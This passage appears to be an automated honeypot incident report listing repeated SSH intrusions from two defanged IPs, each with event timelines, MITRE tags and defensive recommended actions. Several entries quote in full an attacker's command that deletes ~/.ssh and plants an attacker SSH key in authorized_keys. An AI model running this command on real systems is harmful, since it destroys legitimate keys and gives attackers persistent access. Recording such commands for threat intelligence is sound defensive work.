| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:56:19` | `cowrie.session.connect` |
| `2026-05-13 15:56:19` | `cowrie.client.version` |
| `2026-05-13 15:56:19` | `cowrie.client.kex` |
| `2026-05-13 15:56:20` | `cowrie.login.success` |
| `2026-05-13 15:56:20` | `cowrie.session.params` |
| `2026-05-13 15:56:20` | `cowrie.command.input` |
| `2026-05-13 15:56:20` | `cowrie.command.failed` |
| `2026-05-13 15:56:21` | `cowrie.log.closed` |
| `2026-05-13 15:56:21` | `cowrie.session.params` |
| `2026-05-13 15:56:21` | `cowrie.command.input` |
| `2026-05-13 15:56:21` | `cowrie.session.file_download` |
| `2026-05-13 15:56:21` | `cowrie.log.closed` |
| `2026-05-13 15:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24899d6cdcca

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 15:56 |
| **Last Seen** | 2026-05-13 15:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:56:24` | `cowrie.session.connect` |
| `2026-05-13 15:56:24` | `cowrie.client.version` |
| `2026-05-13 15:56:24` | `cowrie.client.kex` |
| `2026-05-13 15:56:25` | `cowrie.login.success` |
| `2026-05-13 15:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-526fb0bf9966

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 15:57 |
| **Last Seen** | 2026-05-13 15:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:57:47` | `cowrie.session.connect` |
| `2026-05-13 15:57:47` | `cowrie.client.version` |
| `2026-05-13 15:57:47` | `cowrie.client.kex` |
| `2026-05-13 15:57:47` | `cowrie.login.success` |
| `2026-05-13 15:57:48` | `cowrie.session.params` |
| `2026-05-13 15:57:48` | `cowrie.command.input` |
| `2026-05-13 15:57:48` | `cowrie.command.failed` |
| `2026-05-13 15:57:48` | `cowrie.log.closed` |
| `2026-05-13 15:57:48` | `cowrie.session.params` |
| `2026-05-13 15:57:48` | `cowrie.command.input` |
| `2026-05-13 15:57:48` | `cowrie.session.file_download` |
| `2026-05-13 15:57:48` | `cowrie.log.closed` |
| `2026-05-13 15:57:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f9bef662c78

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 15:57 |
| **Last Seen** | 2026-05-13 15:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:57:49` | `cowrie.session.connect` |
| `2026-05-13 15:57:49` | `cowrie.client.version` |
| `2026-05-13 15:57:49` | `cowrie.client.kex` |
| `2026-05-13 15:57:49` | `cowrie.login.success` |
| `2026-05-13 15:57:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-563abbe8630f

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 15:58 |
| **Last Seen** | 2026-05-13 15:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:58:04` | `cowrie.session.connect` |
| `2026-05-13 15:58:04` | `cowrie.client.version` |
| `2026-05-13 15:58:04` | `cowrie.client.kex` |
| `2026-05-13 15:58:05` | `cowrie.login.success` |
| `2026-05-13 15:58:05` | `cowrie.session.params` |
| `2026-05-13 15:58:05` | `cowrie.command.input` |
| `2026-05-13 15:58:05` | `cowrie.command.failed` |
| `2026-05-13 15:58:06` | `cowrie.log.closed` |
| `2026-05-13 15:58:06` | `cowrie.session.params` |
| `2026-05-13 15:58:06` | `cowrie.command.input` |
| `2026-05-13 15:58:06` | `cowrie.session.file_download` |
| `2026-05-13 15:58:06` | `cowrie.log.closed` |
| `2026-05-13 15:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-331383886d43

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 15:58 |
| **Last Seen** | 2026-05-13 15:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:58:09` | `cowrie.session.connect` |
| `2026-05-13 15:58:09` | `cowrie.client.version` |
| `2026-05-13 15:58:09` | `cowrie.client.kex` |
| `2026-05-13 15:58:10` | `cowrie.login.success` |
| `2026-05-13 15:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef168c1ed69a

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 15:59 |
| **Last Seen** | 2026-05-13 15:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:59:49` | `cowrie.session.connect` |
| `2026-05-13 15:59:49` | `cowrie.client.version` |
| `2026-05-13 15:59:49` | `cowrie.client.kex` |
| `2026-05-13 15:59:50` | `cowrie.login.success` |
| `2026-05-13 15:59:50` | `cowrie.session.params` |
| `2026-05-13 15:59:50` | `cowrie.command.input` |
| `2026-05-13 15:59:50` | `cowrie.command.failed` |
| `2026-05-13 15:59:51` | `cowrie.log.closed` |
| `2026-05-13 15:59:51` | `cowrie.session.params` |
| `2026-05-13 15:59:51` | `cowrie.command.input` |
| `2026-05-13 15:59:51` | `cowrie.session.file_download` |
| `2026-05-13 15:59:51` | `cowrie.log.closed` |
| `2026-05-13 15:59:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-192b17d47680

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 15:59 |
| **Last Seen** | 2026-05-13 15:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:59:53` | `cowrie.session.connect` |
| `2026-05-13 15:59:53` | `cowrie.client.version` |
| `2026-05-13 15:59:54` | `cowrie.client.kex` |
| `2026-05-13 15:59:54` | `cowrie.login.success` |
| `2026-05-13 15:59:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a6ede09afb1

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 16:01 |
| **Last Seen** | 2026-05-13 16:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:01:35` | `cowrie.session.connect` |
| `2026-05-13 16:01:35` | `cowrie.client.version` |
| `2026-05-13 16:01:35` | `cowrie.client.kex` |
| `2026-05-13 16:01:36` | `cowrie.login.success` |
| `2026-05-13 16:01:37` | `cowrie.session.params` |
| `2026-05-13 16:01:37` | `cowrie.command.input` |
| `2026-05-13 16:01:37` | `cowrie.command.failed` |
| `2026-05-13 16:01:37` | `cowrie.log.closed` |
| `2026-05-13 16:01:37` | `cowrie.session.params` |
| `2026-05-13 16:01:37` | `cowrie.command.input` |
| `2026-05-13 16:01:38` | `cowrie.session.file_download` |
| `2026-05-13 16:01:38` | `cowrie.log.closed` |
| `2026-05-13 16:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c52f91c7d3a

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 16:01 |
| **Last Seen** | 2026-05-13 16:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:01:40` | `cowrie.session.connect` |
| `2026-05-13 16:01:40` | `cowrie.client.version` |
| `2026-05-13 16:01:40` | `cowrie.client.kex` |
| `2026-05-13 16:01:41` | `cowrie.login.success` |
| `2026-05-13 16:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a107d5a2465

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 16:03 |
| **Last Seen** | 2026-05-13 16:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:03:25` | `cowrie.session.connect` |
| `2026-05-13 16:03:25` | `cowrie.client.version` |
| `2026-05-13 16:03:25` | `cowrie.client.kex` |
| `2026-05-13 16:03:26` | `cowrie.login.success` |
| `2026-05-13 16:03:26` | `cowrie.session.params` |
| `2026-05-13 16:03:26` | `cowrie.command.input` |
| `2026-05-13 16:03:26` | `cowrie.command.failed` |
| `2026-05-13 16:03:27` | `cowrie.log.closed` |
| `2026-05-13 16:03:27` | `cowrie.session.params` |
| `2026-05-13 16:03:27` | `cowrie.command.input` |
| `2026-05-13 16:03:27` | `cowrie.session.file_download` |
| `2026-05-13 16:03:27` | `cowrie.log.closed` |
| `2026-05-13 16:03:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44cf0d2a0884

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 16:03 |
| **Last Seen** | 2026-05-13 16:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:03:30` | `cowrie.session.connect` |
| `2026-05-13 16:03:30` | `cowrie.client.version` |
| `2026-05-13 16:03:30` | `cowrie.client.kex` |
| `2026-05-13 16:03:31` | `cowrie.login.success` |
| `2026-05-13 16:03:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2da9333cec70

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:04 |
| **Last Seen** | 2026-05-13 16:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:04:20` | `cowrie.session.connect` |
| `2026-05-13 16:04:20` | `cowrie.client.version` |
| `2026-05-13 16:04:20` | `cowrie.client.kex` |
| `2026-05-13 16:04:20` | `cowrie.login.success` |
| `2026-05-13 16:04:20` | `cowrie.session.params` |
| `2026-05-13 16:04:20` | `cowrie.command.input` |
| `2026-05-13 16:04:20` | `cowrie.command.failed` |
| `2026-05-13 16:04:20` | `cowrie.log.closed` |
| `2026-05-13 16:04:20` | `cowrie.session.params` |
| `2026-05-13 16:04:20` | `cowrie.command.input` |
| `2026-05-13 16:04:20` | `cowrie.session.file_download` |
| `2026-05-13 16:04:20` | `cowrie.log.closed` |
| `2026-05-13 16:04:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2a5836b51a2

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:04 |
| **Last Seen** | 2026-05-13 16:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:04:22` | `cowrie.session.connect` |
| `2026-05-13 16:04:22` | `cowrie.client.version` |
| `2026-05-13 16:04:22` | `cowrie.client.kex` |
| `2026-05-13 16:04:22` | `cowrie.login.success` |
| `2026-05-13 16:04:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19e81f99c6b4

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 16:05 |
| **Last Seen** | 2026-05-13 16:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:05:13` | `cowrie.session.connect` |
| `2026-05-13 16:05:13` | `cowrie.client.version` |
| `2026-05-13 16:05:13` | `cowrie.client.kex` |
| `2026-05-13 16:05:14` | `cowrie.login.success` |
| `2026-05-13 16:05:14` | `cowrie.session.params` |
| `2026-05-13 16:05:14` | `cowrie.command.input` |
| `2026-05-13 16:05:14` | `cowrie.command.failed` |
| `2026-05-13 16:05:14` | `cowrie.log.closed` |
| `2026-05-13 16:05:15` | `cowrie.session.params` |
| `2026-05-13 16:05:15` | `cowrie.command.input` |
| `2026-05-13 16:05:15` | `cowrie.session.file_download` |
| `2026-05-13 16:05:15` | `cowrie.log.closed` |
| `2026-05-13 16:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-662108e0632b

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 16:05 |
| **Last Seen** | 2026-05-13 16:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:05:17` | `cowrie.session.connect` |
| `2026-05-13 16:05:17` | `cowrie.client.version` |
| `2026-05-13 16:05:17` | `cowrie.client.kex` |
| `2026-05-13 16:05:18` | `cowrie.login.success` |
| `2026-05-13 16:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbb582190b33

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:06 |
| **Last Seen** | 2026-05-13 16:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:06:28` | `cowrie.session.connect` |
| `2026-05-13 16:06:28` | `cowrie.client.version` |
| `2026-05-13 16:06:28` | `cowrie.client.kex` |
| `2026-05-13 16:06:29` | `cowrie.login.success` |
| `2026-05-13 16:06:29` | `cowrie.session.params` |
| `2026-05-13 16:06:29` | `cowrie.command.input` |
